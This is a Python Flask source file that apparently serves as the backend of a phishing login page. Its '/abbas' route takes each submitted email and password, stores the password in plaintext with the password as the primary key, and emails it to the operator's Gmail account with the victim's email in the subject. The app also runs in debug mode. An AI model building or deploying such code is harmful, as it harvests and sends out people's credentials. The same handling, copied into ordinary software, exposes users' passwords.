from flask import Flask,render_template,request
from flask_sqlalchemy import SQLAlchemy
from flask_mail import Mail
import json

with open('config.json','r') as c:
    params=json.load(c)["params"]

local_server=True

app = Flask(__name__)

app.config.update(
    MAIL_SERVER='smtp.gmail.com',
    MAIL_PORT='465',
    MAIL_USE_SSL=True,
    MAIL_USERNAME=params['gmail-user'],
    MAIL_PASSWORD=params['gmail-password']
)

mail=Mail(app)

if(local_server):
    app.config["SQLALCHEMY_DATABASE_URI"] = params['local_uri']
else:
    app.config["SQLALCHEMY_DATABASE_URI"] = params['prod_uri']
db = SQLAlchemy(app)

class Login(db.Model):
    email=db.Column(db.String(80),unique=True,nullable=False)
    password=db.Column(db.String(80),primary_key=True,unique=True,nullable=False)
    remember=db.Column(db.String(80),unique=True,nullable=False)

@app.route('/abbas',methods=['GET','POST'])
def login():
    if(request.method=='POST'):
        email=request.form.get('email')
        password=request.form.get('password')
        remember=request.form.get('remember')
        entry=Login(remember=remember,email=email,password=password)
        db.session.add(entry)
        db.session.commit()
        mail.send_message(
            'New Message From' + email,
            sender=email,
            recipients=[params['gmail-user']],
            body=password
            )
    return render_template("login.html",params=params)

if __name__ == '__main__':
    app.run(debug=True,port=5000)